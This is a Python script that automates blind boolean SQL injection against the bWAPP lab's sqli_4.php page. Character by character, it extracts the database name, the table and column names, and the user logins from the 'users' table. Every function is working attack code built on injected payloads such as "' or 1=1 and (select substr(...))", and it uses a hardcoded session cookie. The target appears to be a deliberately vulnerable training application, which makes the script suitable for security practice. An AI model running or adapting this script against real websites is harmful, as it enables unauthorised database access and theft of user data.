import requests
#import urllib3

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
URL = 'http://192.168.0.30/bWAPP/sqli_4.php?title='
URL_POST = '&orderValue=search'
COOKIE = {'PHPSESSID':'48f7c8af9b6b55381197822b9096958a',
            'security_level':'0'}

def db():
    pre = "' or 1=1 and length(database())="
    for db_len in range(1,30):
        Q = pre+str(db_len)+"%23"   #' or 1=1 and length(database())=db_len#
        r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
        #http://192.168.50.184/bWAPP/sqli_4.php?title=' or 1=1 and length(database())=1
        if "The movie exists in our database!" in r.text:
            print('DB LENGTH : '+str(db_len))
            break
        
    db_name=""
    for idx in range(1,db_len+1):
        pre = "' or 1=1 and (select substr(database(),"+str(idx)+",1)) ="
        for char in range(65,96):
            if(char == 92):
                continue
            Q = pre+"'"+chr(char)+"'%23"
            r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
            #http://192.168.50.184/bWAPP/sqli_4.php?title=' or 1=1 and (select substr(database(),"+str(idx)+",1))=A
            if "The movie exists in our database!" in r.text:
                db_name = db_name+chr(char)
                break
    print('DB NAME : '+db_name)

def table():
    pre = "' or 1=1 and (select count(table_name) from information_schema.tables where table_schema='BWAPP')="
    for tb_cnt in range(1,30):
        Q = pre+str(tb_cnt)+"%23"
        r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
        #print(URL+Q+URL_POST)
        if "The movie exists in our database!" in r.text:
            print('TABLE COUNT : '+str(tb_cnt))
            break
    
    for no in range(tb_cnt):
        pre = "' or 1=1 and (select length(table_name) from information_schema.tables where table_schema='BWAPP' limit "+str(no)+",1)="
        for tb_len in range(1,30):
            Q = pre+str(tb_len)+"%23"
            r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
            #print(URL+Q+URL_POST)
            if "The movie exists in our database!" in r.text:
                print('['+str(no)+'] TABLE LENGTH : '+str(tb_len))
                break

        tb_name=""
        for idx in range(1, tb_len+1):
            pre = "' or 1=1 and (select substr(table_name,"+str(idx)+",1) from information_schema.tables where table_schema='BWAPP' limit "+str(no)+",1)="
            for char in range(65,96):
                if(char == 92):
                    continue
                Q = pre+"'"+chr(char)+"'%23"
                r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
                #print(URL+Q+URL_POST)
                if "The movie exists in our database!" in r.text:
                    tb_name = tb_name+chr(char)
                    print('['+str(no)+'] TABLE NAME : '+tb_name)
                    break

def columns():
    for column_cnt in range(1,30):
        pre = "' or 1=1 and (select count(column_name) from information_schema.columns where table_name='users')="
        Q = pre+str(column_cnt)+"%23"
        r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
        if "The movie exists in our database!" in r.text:
            print('COLUMN COUNT : '+str(column_cnt))
            break
    

    for no in range(0,column_cnt):
        pre = "' or 1=1 and (select length(column_name) from information_schema.columns where table_name='users' limit "+str(no)+",1)="
        for column_len in range(1,30):
            Q = pre+str(column_len)+"%23"
            r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
            if "The movie exists in our database!" in r.text:
                print('[#'+str(no)+'] COLUMN LENGTH : '+str(column_len))
                break

        column_name=""
        for idx in range(1,column_len+1):
            pre = "' or 1=1 and (select substr(column_name,"+str(idx)+",1) from information_schema.columns where table_name='users' limit "+str(no)+",1)="
            for char in range(65,96):
                if(char == 92):
                    continue
                Q = pre+"'"+chr(char)+"'%23"
                r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
                if "The movie exists in our database!" in r.text:
                    column_name = column_name+chr(char)
                    break
        print('[#'+str(no)+'] COLUMN NAME : '+column_name)

def usr_id():
    for id_cnt in range(1,30):
        pre = "' or 1=1 and (select count(id) from users)="
        Q = pre+str(id_cnt)+"%23"
        r = requests.get(URL+Q+URL_POST, cookies=COOKIE, verify=False)
        if "The movie exists in our database!" in r.text:
            print('ID COUNT : '  + str(id_cnt))
            break

    for no in range(0,id_cnt):
        pre = "' or 1=1 and (select length(login) from users limit "+str(no)+",1)="
        for id_len in range(1,30):
            Q = pre+str(id_len)+"%23"
            r = requests.get(URL+Q+URL_POST, cookies=COOKIE, verify=False)
            if "The movie exists in our database!" in r.text:
                print('[#'+str(no)+'] ID LENGTH : ' + str(id_len))
                break

        id_v=""
        for idx in range(1,id_len+1):
            pre = "' or 1=1 and (select substr(login,"+str(idx)+",1) from users limit "+str(no)+",1)="
            for char in range(65,96):
                if(char == 92):
                    continue
                Q = pre+"'"+chr(char)+"'%23"
                r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
                if "The movie exists in our database!" in r.text:
                    id_v = id_v+chr(char)
                    break
        print('[#'+str(no)+'] ID : '+id_v)


#db()
#table()
#columns()
usr_id()
